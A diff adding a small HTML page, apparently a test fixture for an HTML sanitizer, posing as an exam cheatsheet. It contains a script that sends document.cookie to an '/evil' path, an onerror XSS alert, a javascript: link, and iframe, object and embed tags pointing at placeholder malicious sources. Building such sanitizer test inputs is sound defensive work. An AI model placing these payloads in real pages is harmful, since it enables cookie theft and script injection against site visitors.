@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Rajasthan Exam Cheatsheet with Hidden Payload</title>
+  <style>
+    body { background-color: red !important; }
+  </style>
+</head>
+<body>
+  <h1>Safe Looking Heading</h1>
+  <p style="color: red; font-size: 50px;">Normal study paragraph with inline styles.</p>
+  <script>
+    window.stealAdminToken = function() { fetch('/evil?cookie=' + document.cookie); };
+  </script>
+  <img src="https://example.com/logo.png" onerror="alert('xss')" alt="Rajasthan Logo" />
+  <a href="javascript:alert('pwned')">Click here for free notes</a>
+  <iframe src="https://malicious-site.com/frame"></iframe>
+  <object data="malicious.swf"></object>
+  <embed src="malicious.pdf"></embed>
+</body>
+</html>
